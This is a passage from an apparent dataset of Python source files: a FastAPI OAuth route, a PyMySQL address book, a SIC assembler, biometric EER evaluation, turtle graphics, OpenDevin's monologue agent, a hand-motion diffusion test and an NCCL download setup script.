{name}!</p><a href=/logout>Logout</a>')\n    return HTMLResponse('<a href=/login>Login with Google</a>')\n\n@app.get('/logout')\ndef logout(request: Request):\n    request.session.pop('user')\n    request.session.clear()\n    return RedirectResponse('/')\n",
    "import sys\r\nimport pymysql\r\nfrom PyQt5.QtWidgets import QApplication\r\n\r\nclass mysqlDB():\r\n    def __init__(self) -> None:\r\n        pymysql.version_info = (1, 4, 2, \"final\", 0)\r\n        pymysql.install_as_MySQLdb()\r\n        super().__init__()\r\n        self.connection = pymysql.connect(\r\n            host='localhost',\r\n            user='pa',\r\n            passwd='1234',\r\n            db='pa',\r\n            charset='utf8',\r\n            port=3306,\r\n            cursorclass=pymysql.cursors.DictCursor\r\n        )\r\n\r\n    def insert(self, new_name, new_phone, new_filename):\r\n        with self.connection.cursor() as cursor:\r\n            sql = \"INSERT INTO addbook (name, phone, filename) VALUES (%s, %s, %s)\"\r\n            result = cursor.execute(sql, (new_name, new_phone, new_filename))\r\n            self.connection.commit()\r\n            return result\r\n    \r\n    def update(self, name_key, new_phone, new_filename):\r\n        with self.connection.cursor() as cursor:\r\n            sql = \"UPDATE addbook SET phone = %s, filename = %s WHERE name = %s\"\r\n            result = cursor.execute(sql, (new_phone, name_key, new_filename))\r\n            self.connection.commit()\r\n            return result\r\n    \r\n    def delete(self, name_key):\r\n        with self.connection.cursor() as cursor:\r\n            sql = \"DELETE FROM addbook WHERE name = %s\"\r\n            result = cursor.execute(sql, name_key)\r\n            self.connection.commit()\r\n            return result\r\n\r\n    def getAllData(self):\r\n        print(\"\uc5ec\uae30\ub294 \uc804\ubd80 \uc77d\uae30\")\r\n        with self.connection.cursor() as cursor:\r\n            sql = \"SELECT * FROM addbook\"\r\n            \r\n        \r\n    def search(self, any_key):\r\n        with self.connection.cursor() as cursor:\r\n            sql = \"SELECT * FROM addbook WHERE 'name' LIKE %s OR phone LIKE %s OR filename LIKE %s\"\r\n            key = '%' + any_key + '%'\r\n            cursor.execute(sql, (key, key, key))\r\n            result = cursor.fetchone()\r\n    \r\n    def pause(self):\r\n        input(\"\ub2e4\uc74c \ud14c\uc2a4\ud2b8\ub97c \uc9c4\ud589\ud558\ub824\uba74 Enter\ub97c \ub204\ub974\uc138\uc694...\")\r\n\r\nif __name__ == '__main__':\r\n    app = QApplication(sys.argv)\r\n    db = mysqlDB()\r\n    \r\n    # \ucd94\uac00 \ud14c\uc2a4\ud2b8\r\n    result = db.insert(\"\ud64d\uae38\ub3d9fromPython\", \"010-1222-1212\", \"C:\\hdh2024\\myPrj02\\res\\dd.jpg\")\r\n    print(\"Insert test: \", result)   \r\n\r\n    # \uc218\uc815 \ud14c\uc2a4\ud2b8\r\n    result = db.update(\"\ud64d\uae38\ub3d9fromPython\",\"010-1222-1214\", \"C:\\hdh2024\\myPrj02\\res\\dd.jpg\")\r\n    print(\"Update Test : \", result)\r\n\r\n    # \ucc3e\uae30 \ud14c\uc2a4\ud2b8\r\n    result = db.search(\"\ud64d\")\r\n    print(\"Search Test : \", result)\r\n\r\n    # \uc0ad\uc81c \ud14c\uc2a4\ud2b8\r\n    result = db.delete(\"\ud64d\uae38\ub3d9fromPython\")\r\n    print(\"Delete Test : \", result)\r\n\r\n    app.exec_()\r\n",
    "import math\r\n\r\ndef hexadecimal_to_decimal(x):\r\n    decimal_number = 0 #Onluk tabana \u00e7evrilen sonucu tutacak de\u011fi\u015fken\r\n    count = 0 #sayac\r\n    \r\n    while x != 0: #Girdi s\u0131f\u0131r olana kadar devam et \r\n        remainder = x % 10 #Girdinin 10'a b\u00f6l\u00fcm\u00fcnden kalan al\u0131nd\u0131 \r\n        decimal_number += remainder * 16 ** count #Kalan, onalt\u0131l\u0131k tabandaki say\u0131ya \u00e7evrildi ve sonuca eklendi\r\n        x = x // 10 #Girdi ondal\u0131k tabana \u00e7evrildi\r\n        count += 1 #Saaya\u00e7 artt\u0131r\u0131ld\u0131\r\n    \r\n    return decimal_number #Onluk tabana \u00e7evrilen say\u0131 d\u00f6nd\u00fcr\u00fcld\u00fc.\r\n\r\ndef read_line_from_file(src, pos):\r\n    line = \"\" #Sat\u0131r\u0131 saklayacak de\u011fi\u015fken olu\u015fturuldu.\r\n    src.seek(pos) #Dosya belirli konuma girildi.\r\n    line = src.readline()#Dosyadan bir sat\u0131r okundu.\r\n    pos = src.tell()#Dosyan\u0131n son konumu sakland\u0131.\r\n    return line, pos #Okunan sat\u0131r ve son konum d\u00f6nd\u00fcr\u00fcld\u00fc.\r\n\r\ndef break_line(line):\r\n    fields = line.split(\"\\t\") #Sat\u0131r, sekme kararkterine par\u00e7aland\u0131\r\n    label = opcode = operand = rest = \"\"#Etiket,opcode,operand ve  geri kalan k\u0131s\u0131mlar i\u00e7in bo\u015fi dizeler olu\u015fturuldu.\r\n    \r\n    if len(fields) >= 1:#E\u011fer sat\u0131r\u0131n en az bir \u00f6\u011fesi varsa:\r\n        label = fields[0].strip()#\u0130lk \u00f6\u011fe, etiket olarak belirlendi ve sonunsdaki bo\u015fluklar temizlendi.\r\n        \r\n    if len(fields) >= 2:# E\u011fer sat\u0131r\u0131n en az iki \u00f6\u011fesi varsa:\r\n        opcode = fields[1].strip()#\u0130kinci \u00f6\u011fe,opcode olarak kabul edilir ve di\u011fer bo\u015fluklar temizlenir.\r\n        \r\n        \r\n    if len(fields) >= 3:#E\u011fe sat\u0131r\u0131n en az \u00fc\u00e7 \u00f6\u011fesi varsa:\r\n        operand = fields[2].strip()#\u00dc\u00e7\u00fcnc\u00fc \u00f6\u011fe,operand olarak kabul edilir ve ba\u015f ve sondaki bo\u015fluklar temizlenir. \r\n        \r\n    if len(fields) >= 4:#E\u011fer sat\u0131r\u0131n en az d\u00f6rt \u00f6\u011fesi varsa\r\n        rest = fields[3].strip()#D\u00f6rd\u00fcnc\u00fc\u011f \u00f6\u011fe ve sonras\u0131 silinir.\r\n        \r\n    return label, opcode, operand, rest # Par\u00e7alanan etiket, opcode, operand ve geri kalan k\u0131s\u0131mlar d\u00f6nd\u00fcr\u00fcl\u00fcr\r\n\r\ndef search_symtab(label):\r\n    found = False#Etikeitn bulunup bulunmad\u0131\u011f\u0131n\u0131 belirten bayrak olu\u015fturuldu.\r\n    \r\n    #symtab.txt dosyas\u0131 okuma modunda a\u00e7\u0131ld\u0131 \r\n    with open(\"symtab.txt\", \"r\") as symtab:\r\n        \r\n        #Dosyan\u0131n her sat\u0131r\u0131 i\u00e7in d\u00f6ng\u00fc olu\u015fturuldu.\r\n        for line in symtab:          \r\n            symbol, value = line.split()#Sat\u0131rdaki sembol ve de\u011fer, bo\u015fluk karakterine g\u00f6re ayr\u0131ld\u0131.\r\n            if symbol == label:#E\u011fer sat\u0131rdaki sembol,aranan etiketle e\u015fle\u015fiyorsa\r\n                found = True #Bulundu bayra\u011f\u0131 olarak  i\u015faretlendi.\r\n                break\r\n    return found #bulundu bayra\u011f\u0131 d\u00f6nd\u00fc\u011fr\u00fcld\u00fc.\r\n\r\ndef search_optab(opcode):# verilen bir opcode'un optab.txt dosyas\u0131nda bulunup bulunmad\u0131\u011f\u0131n\u0131 kontrol etmektir.\r\n    found = False #Opcode var m\u0131 bayra\u011f\u0131 olu\u015fturuldu.\r\n    \r\n    with open(\"optab.txt\", \"r\") as symtab:# \"optab.txt\" dosyas\u0131 okuma modunda a\u00e7\u0131ld\u0131 ve \"symtab\" ad\u0131 alt\u0131nda kullan\u0131ld\u0131\r\n        for line in symtab:#Dosyan\u0131n her sat\u0131r\u0131 i\u00e7in d\u00f6ng\u00fc olu\u015fturuldu.\r\n            symbol, value = line.split()#Sat\u0131rdaki sembol ve de\u011fer,bo\u015fluk karakterine g\u00f6re ayr\u0131ld\u0131.\r\n            if symbol == opcode:#E\u011fer sat\u0131rdaki sembol,aranan opcode ile e\u015fle\u015fiyorsa\r\n                found = True#bulundu\r\n                break\r\n    return found #Bulundu bayra\u011f\u0131 d\u00f6nd\u00fcr\u00fcld\u00fc.\r\n\r\n                        \r\ndef main():\r\n    startaddress = locctr = proglength = 0\r\n    #Ba\u015flang\u0131\u00e7 adresi,konumu,program uzunlu\u011fu 0 ile ba\u015flt\u0131ld\u0131.\r\n    progname = \"\" #Program ismi i\u00e7in bo\u015f sat\u0131r olu\u015fturuldu.\r\n\r\n\r\n    #Kaynak dosyas\u0131 (\"src.txt\") okuma modunda a\u00e7\u0131ld\u0131.\r\n    with open(\"src.txt\", \"r\") as src:\r\n        \r\n        #Kaynak dosyas\u0131 (\"optab.txt\") okuma modunda a\u00e7\u0131ld\u0131.\r\n        with open(\"optab.txt\", \"r\") as optab:\r\n            \r\n              # Ara dosya (\"intermediate.txt\") yazma modunda a\u00e7\u0131ld\u0131\r\n            with open(\"intermediate.txt\", \"w\") as intermediate:#intermediate, program\u0131n ilerleyi\u015fi s\u0131ras\u0131nda \u00fcretilen ge\u00e7ici \u00e7\u0131kt\u0131lar\u0131 i\u00e7erir. \r\n                \r\n                # Sembol tablosu dosyas\u0131 (\"symtab.txt\") yazma modunda a\u00e7\u0131ld\u0131\r\n                with open(\"symtab.txt\", \"w\") as symtab:\r\n                    \r\n                    pos = 0 #Dosya konumu i\u00e7in ba\u015flang\u0131\u00e7 de\u011feri belirlendi\r\n                    \r\n                    \r\n                    while True:\r\n                        line, pos = read_line_from_file(src, pos) # Dosyadan bir sat\u0131r okunarak ve dosya konumu g\u00fcncellenerek \"line\" ve \"pos\" de\u011fi\u015fkenlerine atand\u0131.\r\n                        if not line:#E\u011fer okunan sat\u0131r bo\u015f ise\r\n                            break #D\u00f6ng\u00fcy\u00fc k\u0131r\r\n                        \r\n                         # Okunan sat\u0131r par\u00e7aland\u0131 ve etiket, opcode, operand ve geri kalan k\u0131s\u0131mlar ayr\u0131 de\u011fi\u015fkenlere atand\u0131.\r\n                        label, opcode, operand, rest = break_line(line)\r\n                        \r\n                        #E\u011fer opcode \"START\" ise\r\n                        if opcode == \"START\":\r\n                            #Ba\u015flang\u0131\u00e7 adresi,verilen operand g\u00fcncellendi veya operan yoksa s\u0131f\u0131r olarak b\u0131rak\u0131ld\u0131.\r\n                            startaddress = int(operand, 16) if operand else 0\r\n                   ",
    "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Wed Mar 30 10:02:40 2022\n\n@author: Kid\n\"\"\"\n\nimport numpy as np\n#import tensorflow as tf\n\nfrom scipy.interpolate import interp1d\nfrom scipy.optimize import brentq\nfrom sklearn import metrics\nimport matplotlib.pyplot as plt\n\nbase_fpr = np.linspace(0, 1, 100001)\n\n\ndef Find_EER2(far, tpr):\n\teer = brentq(lambda x : 1. - x - interp1d(far, tpr)(x), 0., 1.)\n\t#fnr = 1 - tpr\n\t#eer=far[np.nanargmin(np.absolute((fnr - far)))]\n\t#eer = brentq(lambda x : 1. - x - far[int(x*100000)], 0., 1.)\n   #print(\"index of min difference=\", y)\n\toptimum = eer\n\treturn optimum\n\ndef EERf(resutls):\n  #print(resutls)\n  resutls = np.array(resutls)\n  y = np.array(resutls[:,1])\n  scores = np.array(resutls[:,0])\n  fpr, tpr, thresholds = metrics.roc_curve(y, scores, pos_label=1)\n  ntpr = np.interp(base_fpr, fpr, tpr)\n  ntpr[0] = 0.0\n  return Find_EER2(base_fpr, ntpr),1-ntpr[1000]\n\n\n\ndef assessment_model(resutls):\n\tresutls2 = np.array(resutls)\n\ty = np.array(resutls2[:,1])\n\tscores = np.array(resutls2[:,0])\n\tfpr, tpr, thresholds = metrics.roc_curve(y, scores, pos_label=1)\n\tntpr = interp1d(fpr, tpr)(base_fpr)\n\tnfpr = interp1d(fpr, tpr)(base_fpr)\n\t#ntpr = np.interp(base_fpr, fpr, tpr)\n\t#nfpr = np.interp(base_fpr, tpr, fpr)\n\tntpr[0] = 0.0\n\tnfpr[0] = 0.0\n\tauc=metrics.auc(fpr, tpr)\n\tprint(Find_EER2(base_fpr, ntpr),1-ntpr[1000])\n\treturn Find_EER2(base_fpr, ntpr),1-ntpr[1000],nfpr[1],ntpr,auc\n \n\n#Please change dataset offset (d1,d2,d3)\n\n\n# d1 , d2 , d3\ntask=\"d1\"\n\n\n\n\nimport pickle\n\nwith open('./Similarity Scores/'+task+'_dicr1.pkl', 'rb') as f:\n    dicr1=pickle.load(f)\n\nwith open('./Similarity Scores/'+task+'_dicr2.pkl', 'rb') as f:\n    dicr2=pickle.load(f)\n\nwith open('./Similarity Scores/'+task+'_dicr3.pkl', 'rb') as f:\n    dicr3=pickle.load(f)\n\n\n\t\nY=np.load('./Similarity Scores/'+task+'Y.npy')\n\n\n\n\n\ntitle=task+\"t3\"\nplt.clf()\nsum1=0\nav_eer=0\nav_eerb=0\neer3=[]\nfor i in dicr3.keys():\n\ttemp,b=EERf(dicr3[i])\n\tav_eerb+=b\n\teer3.append(temp)\n\tav_eer=temp+av_eer\n\tprint(i,EERf(dicr3[i]))\nprint(\"EER avrage:\",av_eer/len(dicr3),\"FaF avrage:\",av_eerb/len(dicr3))\nfont = {'size'   : 14}\nplt.rc('font', **font)\nplt.figure(figsize=(9, 5))\nnames = list(dicr3.keys())\nvalues = eer3\nplt.xticks(names,rotation='vertical')\nplt.ylabel('EER')\nplt.xlabel(\"Subjects\")\nplt.bar(names, values)\nplt. savefig(\"./Plots/\"+title+\"_bar.pdf\",bbox_inches='tight')\n\n\n\n\n\n\n\ntitle=task+\"t3\"\nplt.clf()\nsum1=0\nav_eer=0\nav_eerb=0\neer3=[]\n\n\nplt.clf()\ntprs=[]\naucs=[]\naveer=0\naveerb=0\nfor i in dicr3.keys():\n\ta,b,c,d,auc=assessment_model(dicr3[i])\n\taveer=aveer+a\n\taveerb+=b\n\ttprs.append(d)\n\taucs.append(auc)\nprint(\"EER avrage:\",aveer/len(dicr3),\"FaF avrage:\",aveerb/len(dicr3))\n\n\n\n\nplt.clf()\ntprs = np.array(tprs)\nmean_tprs = tprs.mean(axis=0)\n\nplt.figure(figsize=(8, 6))\n\nplt.plot(base_fpr[0:5000]*100, (1-mean_tprs)[0:5000]*100, 'b')\n\nnewx=list(plt.xticks()[0]) + [base_fpr[1]*1000,0.5]\nnewxtemp=newx.copy()\ni=0\nfor ii in newxtemp:\n\t#print(ii, ii<=0.0)\n\tif ii<=0.0 or ii>5:\n\t\tnewx.remove(ii)\n\t\t\nfor i in range(len(newx)):\n\tif newx[i]>=1:\n\t\tnewx[i]=int(newx[i])\n#newx=newx*100\nnewxm = map(str, newx)\nplt.xticks(newx,newxm)\n#,rotation='vertical'\n\n\nnewy=list(plt.yticks()[0]) + [0]\nnewy=list(np.arange(0,15.5,0.5))\n\n\n\nfont = {'size'   : 20}\nplt.rc('font', **font)\n\nplt.plot([base_fpr[10]*100,0.50,1,5],[(1-mean_tprs)[10]*100,(1-mean_tprs)[500]*100,(1-mean_tprs)[1000]*100,(1-mean_tprs)[5000]*100], ls=\"\", marker=\"o\", label=\"points\",color=\"red\")\nplt.ylabel('False Rejection Rate (%)')\nplt.xlabel('False Acceptance Rate (%)')\nplt.yticks(newy)\nplt.ylim(ymin=0,ymax=3)\nplt.xlim(xmin=-0.02,xmax=5.05)\nplt.grid()\n#plt.show()\nplt. savefig(\"./Plots/\"+title+\"usability.pdf\",bbox_inches='tight')\n\n\n\n\n\n\nprint(\"========================\")\n\ncounti=[]\ncount_all=0\nid_result=np.array([])\nfor i in dicr2.values():\n    tempi=np.array(i.copy())\n    at=0\n    group=[]\n    groupt=[]\n    ttemp=tempi[0,2]\n    for j in tempi:\n        if ttemp==j[2]:\n            groupt.append(j[0:2])\n        else:\n            group.append(groupt)\n            groupt=[]\n            groupt.append(j[0:2])\n            ttemp=j[2]\n    for c in group:\n        c=np.array(c)\n        temp=c[c[:, 0].argsort()]\n        counti.append(temp[-1,1])\n\nprint(\"last iditification acurrecy top one from 5 s1: \", sum(counti)/len(counti))\n\nprint(\"========================\")\n\n\nprint(\"========================\")\n\ncounti=[]\ncount_all=0\nid_result=np.array([])\nfor i in dicr1.values():\n\ttempi=np.array(i.copy())\n\tbase=-1\n\tfor c in np.unique(tempi[:,2]):\n\t\tbase+=np.count_nonzero(Y==c)\n\t#print(\"make sure\",len(i)/base)\n\tcount_all=count_all+(len(i)//base)\n\tfor j in range(len(i)//base):\n\t\ttemp=tempi[0:base,:]\n\t\ttempi=tempi[base:,:]\n\t\ttemp=temp[temp[:, 0].argsort()]\n\t\tif temp[-1,2]==temp[-1,3]:\n\t\t\tcounti.append(1)\n\t\telse:\n\t\t\t#print(\"==================\")\n\t\t\t#print(temp[base-5:base,:])\n\t\t\tpass\nprint(\"iditification acurrecy top one from 5 s1: \", sum(counti)/count_all)\n\nprint(\"========================\")\n\n\n\nprint(\"========================\")\n\nTP=[]\nTN=[]\nFP=[]\nFN=[]\n\ncount_all=0\nid_resu",
    "import turtle\r\nWindow = turtle.Screen()\r\nRunner1killer = turtle.Turtle()\r\nWindow.bgcolor(\"black\")\r\nRunner1killer.color(\"cyan\")\r\nRunner1killer.pensize(5)\r\nRunner1killer.speed(100)\r\nRunner1killer.shape(\"blank\")\r\nfor _ in range(6):\r\n    Runner1killer.fd(100)\r\n    Runner1killer.lt(60)\r\nRunner1killer.color(\"White\")\r\nRunner1killer.pensize(5)\r\nfor _ in range(6):\r\n    Runner1killer.fd(105)\r\n    Runner1killer.lt(60)\r\nRunner1killer.color(\"blue\")\r\nRunner1killer.pensize(7)\r\nfor _ in range(6):\r\n    Runner1killer.fd(110)\r\n    Runner1killer.lt(60)\r\nRunner1killer.color(\"red\")\r\nRunner1killer.pensize(9)\r\nfor _ in range(6):\r\n    Runner1killer.fd(115)\r\n    Runner1killer.lt(60)\r\nRunner1killer.color(\"pink\")\r\nRunner1killer.pensize(11)\r\nfor _ in range(6):\r\n    Runner1killer.fd(120)\r\n    Runner1killer.lt(60)\r\nRunner1killer.color(\"lime\")\r\nRunner1killer.pensize(13)\r\nfor _ in range(6):\r\n    Runner1killer.fd(125)\r\n    Runner1killer.lt(60)\r\nRunner1killer.color(\"Lemon Chiffon\")\r\nRunner1killer.pensize(15)\r\nfor _ in range(6):\r\n    Runner1killer.fd(130)\r\n    Runner1killer.lt(60)\r\nRunner1killer.color(\"White\")\r\nRunner1killer.pensize(17)\r\nfor _ in range(6):\r\n    Runner1killer.fd(135)\r\n    Runner1killer.lt(60)\r\nRunner1killer.color(\"Orange\")\r\nRunner1killer.pensize(19)\r\nfor _ in range(6):\r\n    Runner1killer.fd(140)\r\n    Runner1killer.lt(60)\r\nRunner1killer.speed(10)\r\nRunner1killer.pencolor(\"red\")\r\nRunner1killer.circle(100)\r\nRunner1killer.speed(10)\r\nRunner1killer.color(\"black\")\r\nRunner1killer.circle(100)\r\nRunner1killer.speed(10)\r\nRunner1killer.pencolor(\"White\")\r\nRunner1killer.circle(100)\r\nRunner1killer.speed(10)\r\nRunner1killer.pencolor(\"Black\")\r\nRunner1killer.circle(100)\r\nRunner1killer.speed(10)\r\nRunner1killer.pencolor(\"lime\")\r\nRunner1killer.circle(100)\r\nRunner1killer.speed(10)\r\nRunner1killer.pencolor(\"black\")\r\nRunner1killer.circle(100)\r\nRunner1killer.speed(10)\r\nRunner1killer.pencolor(\"Cyan\")\r\nRunner1killer.circle(100)\r\nRunner1killer.speed(10)\r\nRunner1killer.pencolor(\"black\")\r\nRunner1killer.circle(100)\r\nWindow.exitonclick()\r\n",
    "from typing import List\nfrom opendevin.agent import Agent\nfrom opendevin.state import State\nfrom opendevin.llm.llm import LLM\n\nfrom opendevin.action import (\n    Action,\n    NullAction,\n    CmdRunAction,\n    FileWriteAction,\n    FileReadAction,\n    AgentRecallAction,\n    BrowseURLAction,\n    AgentThinkAction,\n)\n\nfrom opendevin.observation import (\n    Observation,\n    NullObservation,\n    CmdOutputObservation,\n    FileReadObservation,\n    AgentRecallObservation,\n    BrowserOutputObservation,\n)\n\nimport agenthub.monologue_agent.utils.prompts as prompts\nfrom agenthub.monologue_agent.utils.monologue import Monologue\nfrom agenthub.monologue_agent.utils.memory import LongTermMemory\n\nMAX_MONOLOGUE_LENGTH = 20000\nMAX_OUTPUT_LENGTH = 5000\n\nINITIAL_THOUGHTS = [\n    \"I exist!\",\n    \"Hmm...looks like I can type in a command line prompt\",\n    \"Looks like I have a web browser too!\",\n    \"Here's what I want to do: $TASK\",\n    \"How am I going to get there though?\",\n    \"It seems like I have some kind of short term memory.\",\n    \"Each of my thoughts seems to be stored in a JSON array.\",\n    \"It seems whatever I say next will be added as an object to the list.\",\n    \"But no one has perfect short-term memory. My list of thoughts will be summarized and condensed over time, losing information in the process.\",\n    \"Fortunately I have long term memory!\",\n    \"I can just perform a recall action, followed by the thing I want to remember. And then related thoughts just spill out!\",\n    \"Sometimes they're random thoughts that don't really have to do with what I wanted to remember. But usually they're exactly what I need!\",\n    \"Let's try it out!\",\n    \"RECALL what it is I want to do\",\n    \"Here's what I want to do: $TASK\",\n    \"How am I going to get there though?\",\n    \"Neat! And it looks like it's easy for me to use the command line too! I just have to perform a run action and include the command I want to run in the command argument. The command output just jumps into my head!\",\n    'RUN echo \"hello world\"',\n    \"hello world\",\n    \"Cool! I bet I can write files too using the write action.\",\n    \"WRITE echo \\\"console.log('hello world')\\\" > test.js\",\n    \"\",\n    \"I just created test.js. I'll try and run it now.\",\n    \"RUN node test.js\",\n    \"hello world\",\n    \"It works!\",\n    \"I'm going to try reading it now using the read action.\",\n    \"READ test.js\",\n    \"console.log('hello world')\",\n    \"Nice! I can read files too!\",\n    \"And if I want to use the browser, I just need to use the browse action and include the url I want to visit in the url argument\",\n    \"Let's try that...\",\n    \"BROWSE google.com\",\n    '<form><input type=\"text\"></input><button type=\"submit\"></button></form>',\n    \"I can browse the web too!\",\n    \"And once I have completed my task, I can use the finish action to stop working.\",\n    \"But I should only use the finish action when I'm absolutely certain that I've completed my task and have tested my work.\",\n    \"Very cool. Now to accomplish my task.\",\n    \"I'll need a strategy. And as I make progress, I'll need to keep refining that strategy. I'll need to set goals, and break them into sub-goals.\",\n    \"In between actions, I must always take some time to think, strategize, and set new goals. I should never take two actions in a row.\",\n    \"OK so my task is to $TASK. I haven't made any progress yet. Where should I start?\",\n    \"It seems like there might be an existing project here. I should probably start by running `ls` to see what's here.\",\n]\n\n\nclass MonologueAgent(Agent):\n    _initialized = False\n\n    def __init__(self, llm: LLM):\n        super().__init__(llm)\n        self.monologue = Monologue()\n        self.memory = LongTermMemory()\n\n    def _add_event(self, event: dict):\n        if 'args' in event and 'output' in event['args'] and len(event['args']['output']) > MAX_OUTPUT_LENGTH:\n            event['args']['output'] = event['args']['output'][:MAX_OUTPUT_LENGTH] + \"...\"\n\n        self.monologue.add_event(event)\n        self.memory.add_event(event)\n        if self.monologue.get_total_length() > MAX_MONOLOGUE_LENGTH:\n            self.monologue.condense(self.llm)\n\n    def _initialize(self, task):\n        if self._initialized:\n            return\n\n        if task is None or task == \"\":\n            raise ValueError(\"Instruction must be provided\")\n        self.monologue = Monologue()\n        self.memory = LongTermMemory()\n\n        output_type = \"\"\n        for thought in INITIAL_THOUGHTS:\n            thought = thought.replace(\"$TASK\", task)\n            if output_type != \"\":\n                observation: Observation = NullObservation(content=\"\")\n                if output_type == \"run\":\n                    observation = CmdOutputObservation(content=thought, command_id=0, command=\"\")\n                elif output_type == \"read\":\n                    observation = FileReadObservation(content=thought, path=\"\")\n                elif output_type == \"recall\":\n                    observation = AgentRecallObservation(content=thought, memor",
    "import sys\nsys.path.append('.')\nsys.path.append('..')\n\nimport argparse\nimport os\nfrom pathlib import Path\nimport numpy as np\nimport os.path as op\nimport pickle \n\nimport torch\nfrom mano.mano_models import build_mano_aa\n\nfrom torch.utils import data\nfrom ipdb import set_trace as st\nimport trimesh\nfrom models.semantic_conditional_moudle import get_moudle as  moudle_1\nfrom models.contact_conditional_moudle import get_moudle as moudle_2\nfrom data.grab_test import GrabDataset\n \n\ndef test(opt, device):\n    diffusion_moudle_1 = moudle_1(opt)\n    diffusion_moudle_2 = moudle_2(opt)\n    idxs = 0\n\n    diffusion_weight_path_1 = \"checkpoint/semantic_conditional_moudle.pt\"\n    diffusion_weight_path_2 = \"checkpoint/contact_conditional_moudle.pt\"\n\n    diffusion_moudle_1.load_weight_path(diffusion_weight_path_1)\n    diffusion_moudle_2.load_weight_path(diffusion_weight_path_2)\n\n    val_dataset = GrabDataset()\n    val_dl = data.DataLoader(val_dataset, batch_size=3000, shuffle=False, pin_memory=True, num_workers=0)\n\n    new_item = {}\n    with torch.no_grad():\n       for i, item in enumerate(val_dl):\n            test_input_data_dict= item  #item[\"motion\"].shape torch.Size([32, 2531])\n            one_motion = test_input_data_dict['motion']\n\n            res_list_1 = diffusion_moudle_1.full_body_gen_cond_head_pose_sliding_window(one_motion.to(device)) \n            one_motion[:,:,6205:8253] = res_list_1\n            all_res_list = diffusion_moudle_2.full_body_gen_cond_head_pose_sliding_window(one_motion.to(device)) \n\n            preds_new = my_process_data(preds=all_res_list,namelist=test_input_data_dict['name'])\n            with open(\"assets/closed_mano_faces.pkl\", 'rb') as f:\n                hand_face = pickle.load(f)\n\n            hand_verts = preds_new[\"manov3d.r\"]\n            exp_name = 'demo'\n            save_dir = f'exp/{exp_name}'\n\n            aa_name = test_input_data_dict['name']\n            for i in range(len(hand_verts)):\n                hand_mesh = trimesh.Trimesh(vertices=hand_verts[i], faces=hand_face)\n                parts = aa_name[i].split('/')  \n                relevant_parts = [parts[2]] + parts[3].split('_') + [parts[-1].split('.')[0]]\n                formatted_string = '_'.join(relevant_parts)\n                formatted_string = exp_name+'_'+ formatted_string\n                # st()\n                hand_mesh.export(os.path.join(save_dir, f'{formatted_string}.obj'.format(i)))\n                \ndef my_process_data(preds,namelist):\n    models = {'mano_r':build_mano_aa(is_rhand=True,flat_hand=True)}\n\n    targets=dict()\n    for i in range(len(namelist)):\n\n        rot_r = preds[i][0][:3]\n        pose_r = preds[i][0][3:48]\n        trans_r = preds[i][0][48:51]\n        betas_r = preds[i][0][51:61]\n        \n        pose_r = np.concatenate((rot_r.to('cpu'), pose_r.cpu()), axis=0)\n        \n        if i == 0:\n            targets[\"mano.pose.r\"] = torch.from_numpy(pose_r).float().unsqueeze(0).to('cpu')\n            targets[\"mano.beta.r\"] = np.expand_dims(betas_r.cpu().numpy(), axis=0)\n            targets[\"mano.trans.r\"] = np.expand_dims(trans_r.cpu().numpy(), axis=0)                \n        else:\n            targets[\"mano.pose.r\"] = torch.cat([targets[\"mano.pose.r\"],torch.from_numpy(pose_r).float().unsqueeze(0).to('cpu')],dim=0)\n            targets[\"mano.beta.r\"] = np.concatenate([targets[\"mano.beta.r\"],np.expand_dims(betas_r.cpu().numpy(), axis=0)],axis=0)\n            targets[\"mano.trans.r\"] = np.concatenate([targets[\"mano.trans.r\"],np.expand_dims(trans_r.cpu().numpy(), axis=0)],axis=0)\n    # st()\n            \n    gt_pose_r = targets[\"mano.pose.r\"]\n    gt_betas_r = targets[\"mano.beta.r\"]\n    gt_trans_r = targets[\"mano.trans.r\"]\n\n    temp_gt_out_r = models[\"mano_r\"](\n        betas=torch.from_numpy(gt_betas_r),\n        hand_pose=gt_pose_r[:, 3:],\n        global_orient=gt_pose_r[:, :3],\n        transl=torch.from_numpy(gt_trans_r),\n    )\n    targets[\"manoj21.r\"] = temp_gt_out_r.joints\n    targets[\"manov3d.r\"] = temp_gt_out_r.vertices\n\n    return targets\n\ndef parse_opt():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--workers', type=int, default=0, help='the number of workers for data loading')\n    parser.add_argument('--device', default='0', help='cuda device')\n    parser.add_argument('--weight', default='latest')\n    parser.add_argument(\"--gen_vis\", action=\"store_true\")\n    # For AvatarPoser config \n    parser.add_argument('--kinpoly_cfg', type=str, default=\"\", help='Path to option JSON file.')\n    # Diffusion model settings\n    parser.add_argument('--diffusion_window', type=int, default=1, help='horizon')\n    parser.add_argument('--diffusion_batch_size', type=int, default=200, help='batch size')\n    parser.add_argument('--diffusion_learning_rate', type=float, default=1e-5, help='generator_learning_rate')\n\n    parser.add_argument('--diffusion_n_dec_layers', type=int, default=4, help='the number of decoder layers')\n    parser.add_argument('--diffusion_n_head', type=int, default=4, help='the number of heads in self-a",
    "# this is actually a download and install script\n# it appears in `pip` style `setup.py` file, to be easily installable with `pip install`\n\nfrom setuptools import setup, find_packages\nimport platform\nimport os\nfrom dataclasses import dataclass\n\n# for reference, we can download nccl from the following links\n\n@dataclass\nclass DistInfo:\n    cuda_version: str\n    full_version: str\n    public_version: str\n    filename_linux: str\n\n    def get_url(self, architecture: str) -> str:\n        url_temp = \"https://developer.download.nvidia.com/compute/redist/nccl/v{}/{}\".format(\n            self.public_version, self.filename_linux)\n        return url_temp.replace(\"x86_64\", architecture)\n\n# taken from https://developer.download.nvidia.com/compute/redist/nccl/\navailable_dist_info = [\n    # nccl 2.16.5\n    DistInfo('11.8', '2.16.5', '2.16.5', 'nccl_2.16.5-1+cuda11.8_x86_64.txz'),\n    DistInfo('12.0', '2.16.5', '2.16.5', 'nccl_2.16.5-1+cuda12.0_x86_64.txz'),\n    # nccl 2.17.1\n    DistInfo('11.0', '2.17.1', '2.17.1', 'nccl_2.17.1-1+cuda11.0_x86_64.txz'),\n    DistInfo('12.0', '2.17.1', '2.17.1', 'nccl_2.17.1-1+cuda12.0_x86_64.txz'),\n    # nccl 2.18.1\n    DistInfo('11.0', '2.18.1', '2.18.1', 'nccl_2.18.1-1+cuda11.0_x86_64.txz'),\n    DistInfo('12.0', '2.18.1', '2.18.1', 'nccl_2.18.1-1+cuda12.0_x86_64.txz'),\n    # nccl 2.20.3\n    DistInfo('11.0', '2.20.3', '2.20.3', 'nccl_2.20.3-1+cuda11.0_x86_64.txz'),\n    DistInfo('12.2', '2.20.3', '2.20.3', 